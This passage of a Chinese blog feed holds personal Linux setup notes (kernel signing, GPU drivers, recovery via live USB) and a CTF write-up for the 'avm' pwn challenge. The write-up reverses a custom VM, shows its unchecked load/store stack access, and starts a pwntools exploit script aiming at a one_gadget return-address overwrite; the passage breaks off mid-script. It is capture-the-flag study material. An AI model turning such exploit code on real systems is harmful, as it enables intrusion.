id="其他">其他</h2><p>第三方应用：/opt<br>自定义相关：/usr/share<br>systemctl 命令<br>mount命令用-o指定挂载参数，-t指定分区，用df -h查看挂载情况，fdisk -l查看磁盘情况</p><h1>通用排错</h1><h2 id="journalctl">journalctl</h2><p>journalctl命令可以输出systemd的日志，参考帮助参数，其可以输出很多东西，包括启动过程中的日志。</p><h2 id="Arch-LiveCD">Arch LiveCD</h2><p>用你的安装盘，其自带一个mini的arch系统，和我们安装时候做的一样，将主系统挂载到/mnt之后，可以在你的主系统翻车之后用其修复。我在尝试替换运行库的时候将一个低版本的libm.so.6放入了系统lib库（改名）结果全烂了，命令用不了加系统关机无法启动，直接插上liveCD改名后挂载改回来就行了。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;首先的首先，最重要的参考来自于&lt;a href=&quot;https://arch.icekylin.online/guide/rookie/pre-install.html&quot;&gt;archlinux简明指南&lt;/a&gt;&lt;/strong&gt;。&lt;/p&gt;
&lt;h1&gt;写在前面&lt;/h1&gt;</summary>
      
    
    
    
    <category term="linux" scheme="https://zjw1nd.github.io/categories/linux/"/>
    
    
    <category term="linux" scheme="https://zjw1nd.github.io/tags/linux/"/>
    
  </entry>
  
  <entry>
    <title>linux杂谈（持续更新）</title>
    <link href="https://zjw1nd.github.io/2025/02/24/linux%E6%9D%82%E8%B0%88%EF%BC%88%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0%EF%BC%89/"/>
    <id>https://zjw1nd.github.io/2025/02/24/linux%E6%9D%82%E8%B0%88%EF%BC%88%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0%EF%BC%89/</id>
    <published>2025-02-24T08:26:14.000Z</published>
    <updated>2025-03-10T03:12:57.542Z</updated>
    
    <content type="html"><![CDATA[<p>这篇文章可能都是什么也不懂的时候记录一些了解到的知识，kernel pwn也会放在linux这个类下，可能以后学了内核pwn会有不同的感受吧。</p><h2 id="2023-11-26-linux文件系统根目录下那些都是干什么的？">2023.11.26 linux文件系统根目录下那些都是干什么的？</h2><p>参考<a href="https://www.runoob.com/linux/linux-system-contents.html">菜鸟教程</a>的内容。简单谈点理解。<br>“文件是对字节流的抽象。”而linux也是一个有着“一切皆文件”思想的系统。而无论是什么样的linux发行版，基本根目录下都是那几个文件夹。简单了解下这个文件系统以及它根目录下那些文件夹名字的含义。类似Program Files这种吧。</p><p>草文件系统好复杂，不当了不当linux高手了.jpg</p><h2 id="2024-3-关于linux安装、内核升级、显卡驱动、内核签名等小总结">2024.3 关于linux安装、内核升级、显卡驱动、内核签名等小总结</h2><p>自己花200买了个固态u盘，装一手linux，打算搞成一个平常用的环境。同时windows下装了kali的wsl版本，顺带升级了win11专业版。</p><p>看中省事的集成图形化界面+中文社区装了deepin，这个过程很简单，按照官方教程（有集成好的应用程序），一件配置安装就好了。<br>踩坑主要是显示方面的问题，个人笔记本一直开启的独显直连，最早的显卡驱动无法调节亮度，deepin源apt安装的话报错和内核的驱动版本版本不符，而且仍然无法调节亮度。各种踩坑就跳过，总之解决过程是去英伟达官网下载对应型号的生产环境闭源驱动后安装（退出图形化界面然后直接找到文件执行），参考<a href="https://bbs.deepin.org/zh/post/232923?offset=0&amp;postId=1317417">这篇文章</a>。安装好之后开启显卡的亮度调节，跳过不能用的方法，参考的<a href="https://bbs.deepin.org.cn/zh/post/257837">这篇</a>，conf文件中开启<code>EnableBrightnessControl=1</code>，也是挺幽默的。</p><p>然后自己编译升级了一下内核（能解决笔记本合盖待机无法唤醒的问题），新就是好（错乱）。内核编译参考<a href="https://linux.cn/article-16252-1.html">这篇文章</a>，说的非常详细了。但是拯救者无法识别自带音响和麦克风的问题似乎被忘记了…看到内核6.3版本的时候有大佬说这个问题和主板有关系，提交内核patch被拒绝了说这个问题已经在解决，可惜目前还没有，参考<a href="https://bbs.deepin.org/post/249003">这篇</a>（没什么用）和<a href="https://github.com/xuwd1/lenovo-legion-slim7i-gen7-knowledges/wiki/%E8%A7%A3%E5%86%B3%E6%97%A0%E5%A4%96%E6%94%BE%E5%A3%B0%E9%9F%B3%E7%9A%84%E9%97%AE%E9%A2%98">这篇</a>文章。</p><blockquote><p>另外还能将自己的id加在内核后面，好玩。</p></blockquote><p>然后选择的最新的6.8.1内核。虽然是官方发布的内核但是没有发行版的签名，secure boot过不了，windows玩瓦那个b反作弊又要求开secure boot很烦，所以又要自己去签名内核。直接问了copilot加上自己搜索，执行以下几条命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">openssl req -new -x509 -newkey rsa:2048 -keyout MOK.priv -outform DER -out MOK.der -nodes -days 36500 -subj &quot;/CN=ZJ Secure Boot Signing Key/&quot;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">可能会要求输入密码，等下uefi启动会用</span></span><br><span class="line">sudo mokutil --import MOK.der</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">这里要先安装sbsign，apt就行 sudo apt install sbsigntool</span></span><br><span class="line">sudo sbsign --key MOK.priv --cert MOK.der --output /boot/vmlinuz-$(uname -r) /boot/vmlinuz-$(uname -r)</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">报错了，问了copilot然后将证书改成.pem格式：</span></span><br><span class="line">openssl x509 -in MOK.der -inform DER -out MOK.pem -outform PEM</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">重新执行</span></span><br><span class="line">sudo sbsign --key MOK.priv --cert MOK.pem --output /boot/vmlinuz-$(uname -r) /boot/vmlinuz-$(uname -r)</span><br></pre></td></tr></table></figure><p>重启即可，这时候就可以打开secure boot了。从linux重启的时候会进入一个引导界面，选择enroll key然后输入密码即可。但是第一次启动gui界面直接花屏了，吓得我以为显卡驱动模块也要单独签名，结果再重启一次一切就正常了。这是一个没有任何关于密码学、证书、签名、非对称加密经验的人手动签名内核的经历。</p><h2 id="2024-6-2-Arch启动">2024.6.2 Arch启动</h2><p>deepinV20的glibc版本太低了很难受，先是重装了一个V23，但是效果不是很理想，不太喜欢V23的UI风格，而且流畅度还有缺陷。犹豫了一下加入Arch神教，好在现在已经有archinstall的脚本可以快速配置。不得不说KDE plasma就是漂亮——但是涉及显示问题就很多了。<br>外接屏幕不好用，显卡切换的问题，英伟达对wayland不支持…太史了。还是决定以后用这个系统就integrated模式算了，流畅度什么的也很高用着很舒服。还需要把安装的软件优化一下精简一下体积。毕竟都用arch了多少还是得洁癖一下。</p><p>彻底放弃英伟达，nouveau模块命名黑名单了没装，按照各种办法包括不从图形界面启动也调了但是没用，英伟达驱动开不了，应该是pacman的那个版本可能没法自动装载驱动，导致n卡默认驱动一直是nouveau但是我又禁用了它就一直没法输出。懒得搞了</p><p>2024.8不死心又搞了一次，mkinitcpio做内核镜像直接将nvidia挂载上，驱动是装上了显卡也能用（在xorg下）但是外接屏幕还是没用，运行一下nvidia-xconfig直接将图形化干没了，试了网上的解决方法都不行，最后直接删了xorg.conf然后配置sddm wayland启动 滚吧</p><h2 id="2025-2">2025.2</h2><p>最近课程设计比较轻松，重新搞这个arch，闲鱼花了20远程装了下，最后发现是nvidia的闭源驱动和内核版本强绑定，长时间没滚就寄了，装的时候还说我这依赖也烂。。。问题一堆但总算装上了，然而我自己折腾双显卡的时候，用了envycontrol，切换到集显一开机直接花屏了，livecd试着修了下也没办法，考虑到装的时候的那一堆问题，干脆推倒重来算了。</p><p>重装arch反而是最简单的，装好之后用btrfs文件系统回滚不要太爽，ext4吃屎去吧。重装之后直接pacman nvidia，有了前面踩坑的经验二周目速通了，配置内核参数似乎都不用就能开？</p><p>总之optimus manager也是搞上了，装好之后电源策略bbswitch一错直接回滚或者重装懒得bb。整理一个新的总集篇好吧</p><h2 id="2025-3">2025.3</h2><p>因为patch c++lib的时候刷到帖子直接copy libm.so到系统路径下做替换的想试试，结果直接烂了，命令用不了操作做不了，开机直接蓝屏。这时候直接插上启动盘把主系统挂载上改回来就行。</p><h2 id="shell脚本学习">shell脚本学习</h2><p>shell声明 <code>#! /bin/bash</code></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;这篇文章可能都是什么也不懂的时候记录一些了解到的知识，kernel pwn也会放在linux这个类下，可能以后学了内核pwn会有不同的感受吧。&lt;/p&gt;
&lt;h2 id=&quot;2023-11-26-linux文件系统根目录下那些都是干什么的？&quot;&gt;2023.11.26 linux文件</summary>
      
    
    
    
    <category term="linux" scheme="https://zjw1nd.github.io/categories/linux/"/>
    
    
    <category term="linux" scheme="https://zjw1nd.github.io/tags/linux/"/>
    
  </entry>
  
  <entry>
    <title>IDA-Better_printk推广</title>
    <link href="https://zjw1nd.github.io/2025/02/20/IDA-Better-printk%E6%8E%A8%E5%B9%BF/"/>
    <id>https://zjw1nd.github.io/2025/02/20/IDA-Better-printk%E6%8E%A8%E5%B9%BF/</id>
    <published>2025-02-20T14:22:10.000Z</published>
    <updated>2025-02-21T08:08:27.614Z</updated>
    
    
    
    
    <category term="Develop" scheme="https://zjw1nd.github.io/categories/Develop/"/>
    
    
    <category term="逆向" scheme="https://zjw1nd.github.io/tags/%E9%80%86%E5%90%91/"/>
    
    <category term="Develop" scheme="https://zjw1nd.github.io/tags/Develop/"/>
    
  </entry>
  
  <entry>
    <title>ciscn_ccb2025初赛-avm重做wp</title>
    <link href="https://zjw1nd.github.io/2025/02/20/ciscn-ccb2025%E5%88%9D%E8%B5%9B-avm%E9%87%8D%E5%81%9Awp/"/>
    <id>https://zjw1nd.github.io/2025/02/20/ciscn-ccb2025%E5%88%9D%E8%B5%9B-avm%E9%87%8D%E5%81%9Awp/</id>
    <published>2025-02-20T14:19:56.000Z</published>
    <updated>2025-02-21T08:01:11.163Z</updated>
    
    <content type="html"><![CDATA[<h1>题目分析</h1><h2 id="逆向虚拟机结构">逆向虚拟机结构</h2><p>这道题目的虚拟机还算规整，从main函数开始看，从对虚拟机初始化的函数入手并结合代码执行的函数可以看出，整体的vm结构放在了bss，包括32个通用寄存器，rip，代码指针和代码大小。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> vm *__fastcall <span class="title function_">initvm</span><span class="params">(<span class="keyword">struct</span> vm *mem, __int64 code, <span class="type">unsigned</span> __int64 size)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">vm</span> *<span class="title">result</span>;</span> <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+24h] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  mem-&gt;CS_code_start = code;</span><br><span class="line">  mem-&gt;code_size = size;</span><br><span class="line">  result = mem;</span><br><span class="line">  mem-&gt;RIP = <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">31</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    result = mem;</span><br><span class="line">    mem-&gt;regs[i] = <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>虚拟机结构体如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00000000</span> <span class="class"><span class="keyword">struct</span> <span class="title">vm</span> // <span class="title">sizeof</span>=</span><span class="number">0x118</span></span><br><span class="line"><span class="number">00000000</span> &#123;                                       <span class="comment">// XREF: .bss:vm/r</span></span><br><span class="line"><span class="number">00000000</span>     __int64 regs[<span class="number">32</span>];</span><br><span class="line"><span class="number">00000100</span>     __int64 RIP;</span><br><span class="line"><span class="number">00000108</span>     __int64 CS_code_start;</span><br><span class="line"><span class="number">00000110</span>     <span class="type">unsigned</span> __int64 code_size;</span><br><span class="line"><span class="number">00000118</span> &#125;;</span><br></pre></td></tr></table></figure><h2 id="逆向指令集">逆向指令集</h2><p>这里复现的时候也头晕的不行，我们先看执行函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">execute</span><span class="params">(<span class="keyword">struct</span> vm *vm)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> insn; <span class="comment">// [rsp+1Ch] [rbp-114h]</span></span><br><span class="line">  _BYTE s[<span class="number">264</span>]; <span class="comment">// [rsp+20h] [rbp-110h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v4; <span class="comment">// [rsp+128h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x100</span>uLL);</span><br><span class="line">  <span class="keyword">while</span> ( vm-&gt;RIP &lt; vm-&gt;code_size )</span><br><span class="line">  &#123;</span><br><span class="line">    insn = *(_DWORD *)(vm-&gt;CS_code_start + (vm-&gt;RIP &amp; <span class="number">0xFFFFFFFFFFFFFFFC</span>LL)) &gt;&gt; <span class="number">28</span>;<span class="comment">// rip指针四字节对齐</span></span><br><span class="line">    <span class="keyword">if</span> ( insn &gt; <span class="number">0xA</span> || !insn )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Unsupported instruction&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> v4 - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">    &#125;</span><br><span class="line">    ((<span class="type">void</span> (__fastcall *)(<span class="keyword">struct</span> vm *, _BYTE *))funcs_1AAD[insn])(vm, s);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v4 - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到，虚拟机指令最终的执行是借助一个vtable实现的。逐一分析vtable里的函数就能还原指令的功能，包括add,sub等常见运算与两个关键的访存指令指令包含三个操作数和一个操作码。最高4位是操作数，限制为0-10，用于下标直接从vtable中索引操作。而其余三个操作数对于运算指令来说，分为最低5位，次5位和高字的低5位（16-20）。用5位数0-31来在32个通用寄存器中索引操作，第一操作数为5-9，第二操作数位16-20，第三操作数（结果寄存器）为0-4.</p><blockquote><p>ps: 这里绕了我半天，每次看着看着就不记得哪个减哪个了，也不确定自己封装的对不对…</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> vm *__fastcall <span class="title function_">sub</span><span class="params">(<span class="keyword">struct</span> vm *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">vm</span> *<span class="title">result</span>;</span> <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v2; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  v2 = *(_DWORD *)(a1-&gt;CS_code_start + (a1-&gt;RIP &amp; <span class="number">0xFFFFFFFFFFFFFFFC</span>LL));</span><br><span class="line">  a1-&gt;RIP += <span class="number">4LL</span>;</span><br><span class="line">  result = a1;</span><br><span class="line">  a1-&gt;regs[v2 &amp; <span class="number">0x1F</span>] = a1-&gt;regs[(v2 &gt;&gt; <span class="number">5</span>) &amp; <span class="number">0x1F</span>] - a1-&gt;regs[HIWORD(v2) &amp; <span class="number">0x1F</span>];</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而两个访存指令则比较特别，对于load，其可以从一个指定地址加载8字节到一个通用寄存器。虚拟机运行指令时会在调用指令前的一个函数内分配一段空间并作为参数传入。这个指令也是三个操作数，不同的是会用一个寄存器做基地址，高字的低12位做偏移来针对a2做索引，然后结果放入结果寄存器。store则与其相反，参数规则一样，是将结果寄存器内容存入指定地址。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> *__fastcall <span class="title function_">load</span><span class="params">(<span class="keyword">struct</span> vm *vm, <span class="type">char</span> *a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">void</span> *result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> __int16 v3; <span class="comment">// [rsp+1Eh] [rbp-22h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> cur_instruc; <span class="comment">// [rsp+20h] [rbp-20h]</span></span><br><span class="line"></span><br><span class="line">  cur_instruc = *(_DWORD *)(vm-&gt;CS_code_start + (vm-&gt;RIP &amp; <span class="number">0xFFFFFFFFFFFFFFFC</span>LL));</span><br><span class="line">  vm-&gt;RIP += <span class="number">4LL</span>;</span><br><span class="line">  result = (<span class="type">void</span> *)(<span class="type">unsigned</span> __int8)byte_4010;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int8)(vm-&gt;regs[(cur_instruc &gt;&gt; <span class="number">5</span>) &amp; <span class="number">0x1F</span>] + BYTE2(cur_instruc)) &lt; (<span class="type">unsigned</span> __int8)byte_4010 )</span><br><span class="line">  &#123;</span><br><span class="line">    result = vm;</span><br><span class="line">    v3 = vm-&gt;regs[(cur_instruc &gt;&gt; <span class="number">5</span>) &amp; <span class="number">0x1F</span>] + (HIWORD(cur_instruc) &amp; <span class="number">0xFFF</span>);</span><br><span class="line">    vm-&gt;regs[cur_instruc &amp; <span class="number">0x1F</span>] = ((<span class="type">unsigned</span> __int64)(<span class="type">unsigned</span> __int8)a2[v3 + <span class="number">7</span>] &lt;&lt; <span class="number">56</span>) | ((<span class="type">unsigned</span> __int64)(<span class="type">unsigned</span> __int8)a2[v3 + <span class="number">6</span>] &lt;&lt; <span class="number">48</span>) | ((<span class="type">unsigned</span> __int64)(<span class="type">unsigned</span> __int8)a2[v3 + <span class="number">5</span>] &lt;&lt; <span class="number">40</span>) | ((<span class="type">unsigned</span> __int64)(<span class="type">unsigned</span> __int8)a2[v3 + <span class="number">4</span>] &lt;&lt; <span class="number">32</span>) | ((<span class="type">unsigned</span> __int64)(<span class="type">unsigned</span> __int8)a2[v3 + <span class="number">3</span>] &lt;&lt; <span class="number">24</span>) | ((<span class="type">unsigned</span> __int64)(<span class="type">unsigned</span> __int8)a2[v3 + <span class="number">2</span>] &lt;&lt; <span class="number">16</span>) | *(<span class="type">unsigned</span> __int16 *)&amp;a2[v3];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1>漏洞分析</h1><p>显然，访存指令的权限太大了。这个指令里的偏移能索引0xfff，也就是说我们能够在一个相当大范围的栈上任意读写。构造ROP或者直接ret2og都是可以的。不过这道题的难点是，他没有泄露，我们需要自己去凑libc地址，所以从栈上想办法找一个“好”的地址就成为了本题的关键。但比较恶心的是，可能由于aslr的存在，栈内部的偏移许多都是不固定的，因此这道题让我掌握了一个很宝贵的经验，也就是<strong>合理使用search+distance指令组合拳</strong>。</p><blockquote><p>另外有一个简单的点，由于0xfff实在太大了，我们可以load和store我们输入的code内容，也就是说基本是直球的栈上任意地址读写。</p></blockquote><h2 id="pwndbg好用捏">pwndbg好用捏</h2><p>pwndbg为我们提供了轮椅为什么不用？调试过程中会以返回地址形式显示函数调用堆栈，我们可以直接找最近的libc内地址，直接<code>search -t pointer</code>，然后<code>distance $rsi</code>，就能看到需要多少的偏移。找一个不变的即可，比stack之后肉眼观察强太多了。</p><h2 id="onegadget">onegadget</h2><p>这里og选取不是很容易，改完返回地址程序退出后rbp是0x1导致很多条件简单的og用不了，这个是直接从网上的wp copy的，实战过程中可以一个个试一试，指定<code>-l 1</code>之后其实也没有太多。</p><h1>exp</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> p32</span><br><span class="line">context.terminal=[<span class="string">&quot;cmd.exe&quot;</span>,<span class="string">&quot;/c&quot;</span>, <span class="string">&quot;start&quot;</span>, <span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, <span class="string">&quot;wsl.exe&quot;</span>, <span class="string">&quot;-e&quot;</span>]</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>,checksec=<span class="literal">False</span>)</span><br><span class="line">libc=elf.libc</span><br><span class="line">p = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment"># 4字节指令</span></span><br><span class="line"><span class="comment"># 32位</span></span><br><span class="line"><span class="comment"># 高四位是操作码，从0-10对应10个指令</span></span><br><span class="line"><span class="comment"># 低5位是一个寄存器</span></span><br><span class="line"><span class="comment"># </span></span><br><span class="line"><span class="comment"># 4 7 5 | 6 5 5</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 参数全部都是寄存器编号</span></span><br><span class="line"><span class="comment"># a op b -&gt; c</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">code</span>(<span class="params">op,a,b,c</span>):</span><br><span class="line">    <span class="keyword">return</span> p32(((op &amp; <span class="number">0xF</span>)&lt;&lt;<span class="number">28</span>) + ((b &amp; <span class="number">0x1f</span>)&lt;&lt;<span class="number">16</span>) + ((a &amp; <span class="number">0x1f</span>)&lt;&lt;<span class="number">5</span>) + (c &amp; <span class="number">0x1f</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">a,b,result</span>):</span><br><span class="line">    <span class="keyword">return</span> code(<span class="number">1</span>,a,b,result)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sub</span>(<span class="params">a,b,result</span>):</span><br><span class="line">    <span class="keyword">return</span> code(<span class="number">2</span>,a,b,result)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mul</span>(<span class="params">a,b,result</span>):</span><br><span class="line">    <span class="keyword">return</span> code(<span class="number">3</span>,a,b,result)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">div</span>(<span class="params">a,b,result</span>):</span><br><span class="line">    <span class="keyword">return</span> code(<span class="number">4</span>,a,b,result)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xor</span>(<span class="params">a,b,result</span>):</span><br><span class="line">    <span class="keyword">return</span> code(<span class="number">5</span>,a,b,result)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">my_and</span>(<span class="params">a,b,result</span>):</span><br><span class="line">    <span class="keyword">return</span> code(<span class="number">6</span>,a,b,result)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">slr</span>(<span class="params">a,b,result</span>):</span><br><span class="line">    <span class="keyword">return</span> code(<span class="number">7</span>,a,b,result)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">shr</span>(<span class="params">a,b,result</span>):</span><br><span class="line">    <span class="keyword">return</span> code(<span class="number">8</span>,a,b,result)</span><br><span class="line"></span><br><span class="line"><span class="comment"># </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">store</span>(<span class="params">base,offset,content</span>):</span><br><span class="line">    op = <span class="number">0x9</span> &lt;&lt; <span class="number">28</span></span><br><span class="line">    off = (offset &amp; <span class="number">0xFFF</span>) &lt;&lt; <span class="number">16</span></span><br><span class="line">    cont = content &amp; <span class="number">0x1F</span></span><br><span class="line">    b = (base &amp; <span class="number">0x1f</span>) &lt;&lt; <span class="number">5</span></span><br><span class="line">    <span class="keyword">return</span> p32(op + off + b + cont)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">load</span>(<span class="params">base,offset,r</span>):</span><br><span class="line">    op = <span class="number">0xA</span> &lt;&lt; <span class="number">28</span></span><br><span class="line">    off = (offset &amp; <span class="number">0xFFF</span>) &lt;&lt; <span class="number">16</span></span><br><span class="line">    target = r &amp; <span class="number">0x1F</span></span><br><span class="line">    b = (base &amp; <span class="number">0x1f</span>) &lt;&lt; <span class="number">5</span></span><br><span class="line">    <span class="keyword">return</span> p32(op + off + b + target)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 指令本身提供任意地址读写</span></span><br><span class="line"><span class="comment"># 因此需要找合适地址做写入，code就在栈上，偷地址出来然后试着改</span></span><br><span class="line"><span class="comment"># 一般这种题的思路都是先试og，不行再试试system</span></span><br><span class="line"><span class="comment"># 首先，先检查泄露，这道题没有任何输出内容，要泄露需要自己调puts，会很麻烦</span></span><br><span class="line"><span class="comment"># </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 这道题的核心是要想办法在寄存器凑出一个关键的写入地址</span></span><br><span class="line"><span class="comment"># 他妈的我的脑子就是绕不过来这个指令</span></span><br><span class="line"><span class="comment"># 哦，原来是在执行访存指令时会额外传入一个栈上的地址做偏移，我们相当于可以在栈上一个地址偏移0x100范围内操作</span></span><br><span class="line"><span class="comment"># 可以从栈上找好的地址</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># search -t dword 0xa1200001</span></span><br><span class="line"><span class="comment"># distance $rsi 